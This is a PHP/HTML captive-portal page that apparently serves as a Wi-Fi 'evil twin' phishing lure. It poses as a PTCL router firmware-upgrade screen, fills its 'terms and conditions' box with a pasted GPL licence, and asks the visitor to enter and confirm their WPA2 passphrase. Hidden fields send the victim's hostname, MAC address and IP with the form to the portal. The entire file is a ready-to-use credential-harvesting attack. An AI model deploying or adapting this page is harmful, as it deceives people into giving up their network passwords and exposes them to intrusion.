<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

  <html lang="en">
  <head>
    <title>Router Configuration Page</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="bootstrap.min.css">

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }

    </script>

    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/img/update.png"/>

<style type="text/css">

    /* Sticky footer styles
    -------------------------------------------------- */
    html,
    body {
          height: 100%; /* The html and body elements cannot have any padding or margin. */
        }

        /* Wrapper for page content to push down footer */
        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          /* Negative indent footer by it's height */
          margin: 0 auto -60px;
        }

        /* Set the fixed height of the footer here */
        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        /* Lastly, apply responsive CSS fixes as necessary */
        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }
  </style>




    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: auto;
      }

      .card {
        margin-bottom: 20px;
      }
    </style>

    <style media="screen and (max-width: 580px)">
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: auto;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }
    </style>

  </head>

  <body>

  <!-- Start navigation bar -->
  <!-- To change the navigation bar color change background attribute -->
  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
    <div class="container-fluid">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <!--
        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
        -->
      </div>
      <div class="collapse navbar-collapse" id="myNavbar">
        <ul class="nav navbar-nav">
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Setup</a></li>
              <li><a href="#">DDNS</a></li>
              <li><a href="#">MAC Address Clone</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Wireless Settings</a></li>
              <li><a href="#">Wireless Security</a></li>
              <li><a href="#">Wireless MAC Filter</a></li>
              <li><a href="#">Advanced Wireless Settings</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Firewall</a></li>
              <li><a href="#">VPN</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Internet Access</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Management</a></li>
              <li><a href="#">Log</a></li>
              <li><a href="#">Diagnostics</a></li>
              <li><a href="#">Factory Defaults</a></li>
              <li><a href="#">Config Manegements</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Router</a></li>
              <li><a href="#">Local Network</a></li>
              <li><a href="#">Wireless</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
        </ul>
      </div>
    </div>
  </nav>
  <!-- End navigation bar -->

 <!-- Start page content -->
  <div class="container">
           <div class="col-sm">
       <h2 class="text-center" style="color:RoyalBlue">Router Firmware Upgrade</h2>
        <p class="lead">Please update your firmware for improved security.</p>
        <p class="lead">A new version of the firmware has been downloaded and is awaiting installation.<br> 
	Review our new terms and conditions and proceed.</p>
     </div>
      <div class="form-group">
        <label for="comment">Terms And Conditions:</label>
        <textarea readonly class="form-control" rows="5" id="comment">
GNU General Public License Notice
This product includes software code developed by third parties,
including software code subject to the GNU General Public License
(“GPL”). As applicable, PTCL provides mail service of a machine
readable copy of the corresponding GPL source code on CD-ROM
upon request via email or traditional paper mail. PTCL will
charge for a nominal cost to cover shipping and media charges as
allowed under the GPL. This offer will be valid for at least 3 years.
For GPL inquiries and the GPL CD-ROM information, please contact
us at GPL@PTCL.com or
Building 24(floors 1,3,4,5) and 28(floors1-4) Central Science and
Technology Park, Shennan Rd, Nanshan, Shenzhen,China.
Additionally, PTCL provides for a GPL-Code-Centre under http://
www.PTCL.com/en/support/gpl/ where machine readable copies
of the GPL source codes used in PTCL products are available for
free download. Please note, that the GPL-Code-Centre is only provided
for as a courtesy to PTCL’s customers but may neither offer
a full set of source codes used in all products nor always provide for
the latest or actual version of such source codes.
The GPL Code used in this product is distributed WITHOUT ANY
WARRANTY and is subject to the copyrights of one or more authors.
Please refer to the following GNU General Public License for further
information.
GNU GENERAL PUBLIC LICENSE Version 1, February 1989
 Copyright (C) 1989 Free Software Foundation, Inc.
51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is
not allowed.
Preamble
The license agreements of most software companies try to keep users at the mercy of those companies.
By contrast, our General Public License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users. The General Public License applies to the Free
Software Foundation’s software and to any other program whose authors commit to using it. You can use
it for your programs, too.
When we speak of free software, we are referring to freedom, not price. Specifically, the General Public
License is designed to make sure that you have the freedom to give away or sell copies of free software,
that you receive source code or can get it if you want it, that you can change the software or use pieces of
it in new free programs; and that you know you can do these things.
To protect your rights, we need to make restrictions that forbid anyone to deny you these rights or to ask
you to surrender the rights. These restrictions translate to certain responsibilities for you if you distribute
copies of the software, or if you modify it.
For example, if you distribute copies of a such a program, whether gratis or for a fee, you must give the
recipients all the rights that you have. You must make sure that they, too, receive or can get the source
code. And you must tell them their rights.
We protect your rights with two steps: (1) copyright the software, and (2) offer you this license which
gives you legal permission to copy, distribute and/or modify the software.
Also, for each author’s protection and ours, we want to make certain that everyone understands that
there is no warranty for this free software. If the software is modified by someone else and passed on, we
want its recipients to know that what they have is not the original, so that any problems introduced by
others will not reflect on the original authors’ reputations.
The precise terms and conditions for copying, distribution and modification follow.
GNU GENERAL PUBLIC LICENSE
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
0. This License Agreement applies to any program or other work which contains a notice placed by the
copyright holder saying it may be distributed under the terms of this General Public License. The
“Program”, below, refers to any such program or work, and a “work based on the Program” means
either the Program or any work containing the Program or a portion of it, either verbatim or with
modifications. Each licensee is addressed as “you”.
1. You may copy and distribute verbatim copies of the Program’s source code as you receive it, in any
medium, provided that you conspicuously and appropriately publish on each copy an appropriate
copyright notice and disclaimer of warranty; keep intact all the notices that refer to this General
Public License and to the absence of any warranty; and give any other recipients of the Program a
copy of this General Public License along with the Program. You may charge a fee for the physical
act of transferring a copy.
2. You may modify your copy or copies of the Program or any portion of it, and copy and distribute
such modifications under the terms of Paragraph 1 above, provided that you also do the following:
a ) cause the modified files to carry prominent notices stating that you changed the files and 
the date of any change; and
b ) cause the whole of any work that you distribute or publish, that in whole or in part contains
the Program or any part thereof, either with or without modifications, to be licensed at no
charge to all third parties under the terms of this General Public License (except that you
may choose to grant warranty protection to some or all third parties, at your option).
c ) If the modified program normally reads commands interactively when run, you must cause
it, when started running for such interactive use in the simplest and most usual way, to print
or display an announcement including an appropriate copyright notice and a notice that
there is no warranty (or else, saying that you provide a warranty) and that users may redistribute
the program under these conditions, and telling the user how to view a copy of this
General Public License.
d ) You may charge a fee for the physical act of transferring a copy, and you may at your option
offer warranty protection in exchange for a fee.
e ) Mere aggregation of another independent work with the Program (or its derivative) on a
volume of a storage or distribution medium does not bring the other work under the scope
of these terms.
3. You may copy and distribute the Program (or a portion or derivative of it, under Paragraph 2) in
object code or executable form under the terms of Paragraphs 1 and 2 above provided that you also
do one of the following:
a ) accompany it with the complete corresponding machine-readable source code, which must
be distributed under the terms of Paragraphs 1 and 2 above; or,
b ) accompany it with a written offer, valid for at least three years, to give any third party free
(except for a nominal charge for the cost of distribution) a complete machine-readable copy
of the corresponding source code, to be distributed under the terms of Paragraphs 1 and 2
above; or,
c ) accompany it with the information you received as to where the corresponding source code
may be obtained. (This alternative is allowed only for noncommercial distribution and only
if you received the program in object code or executable form alone.)
Source code for a work means the preferred form of the work for making modifications to it. For an
executable file, complete source code means all the source code for all modules it contains; but, as
a special exception, it need not include source code for modules which are standard libraries that
accompany the operating system on which the executable file runs, or for standard header files or
definitions files that accompany that operating system.
4. You may not copy, modify, sublicense, distribute or transfer the Program except as expressly provided
under this General Public License. Any attempt otherwise to copy, modify, sublicense, distribute
or transfer the Program is void, and will automatically terminate your rights to use the Program under
this License. However, parties who have received copies, or rights to use copies, from you under
this General Public License will not have their licenses terminated so long as such parties remain in
full compliance.
5. By copying, distributing or modifying the Program (or any work based on the Program) you indicate
your acceptance of this license to do so, and all its terms and conditions.
6. Each time you redistribute the Program (or any work based on the Program), the recipient automatically
receives a license from the original licensor to copy, distribute or modify the Program subject
to these terms and conditions. You may not impose any further restrictions on the recipients’ exercise
of the rights granted herein.
7. The Free Software Foundation may publish revised and/or new versions of the General Public License
from time to time. Such new versions will be similar in spirit to the present version, but may
differ in detail to address new problems or concerns.
Each version is given a distinguishing version number. If the Program specifies a version number of
the license which applies to it and “any later version”, you have the option of following the terms and
conditions either of that version or of any later version published by the Free Software Foundation.
If the Program does not specify a version number of the license, you may choose any version ever
published by the Free Software Foundation.
8. If you wish to incorporate parts of the Program into other free programs whose distribution conditions
are different, write to the author to ask for permission. For software which is copyrighted
by the Free Software Foundation, write to the Free Software Foundation; we sometimes make
exceptions for this. Our decision will be guided by the two goals of preserving the free status of all
derivatives of our free software and of promoting the sharing and reuse of software generally.
NO WARRANTY
9. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY FOR THE PROGRAM,
TO THE EXTENT PERMITTED BY APPLICABLE LAW. EXCEPT WHEN OTHERWISE STATED IN
WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM “AS IS” WITHOUT
WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE
ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE
PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR
CORRECTION.
10. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT
HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE THE PROGRAM
AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL
OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM
(INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR
LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH
ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY
OF SUCH DAMAGES.
END OF TERMS AND CONDITIONS
  </textarea>
        <div class="checkbox">
          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
        </div>
      </div>


    <div class="container">
      <div class="account-wall">

        <div class="google-header-bar centered">
          <div class="header content clearfix">
	    <center><img src="assets\img\update.png" alt="Update" width="100" height="100"></center>
          </div>
        </div>

          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">

            <input type="text" name="email" class="form-email" placeholder="WPA2 Passphrase" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="password" name="password" class="form-password" placeholder="Confirm" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button class="btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Update Firmware</button>

          </form>

      </div>
    </div>

  </body>

</html>
